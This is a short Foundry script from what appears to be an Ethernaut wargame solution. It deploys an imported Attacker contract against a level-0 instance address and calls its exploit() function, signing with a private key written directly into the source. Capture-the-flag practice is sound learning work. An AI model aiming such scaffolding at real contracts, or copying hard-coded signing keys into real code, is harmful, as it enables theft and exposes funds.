pragma solidity ^0.8.0;

import {Instance} from "ethernaut-contract/00Hello.sol";
import {Attacker} from "src/00.sol";
import {Script} from "forge-std/Script.sol";

contract AttackScript is Script {
    uint256 privateKey = 0x22b18e293b4372bf1596fc59ded580f09c4e201d57a542242b34576a22d8c941;

    // string network = "arb-sepolia";
    address instanceAddress = 0x7642991AD484cb375443307584621eB3a25d626c;

    function run() public {

        vm.startBroadcast(privateKey);
        Attacker attacker = new Attacker(instanceAddress);
        attacker.exploit();
        vm.stopBroadcast();
    }
}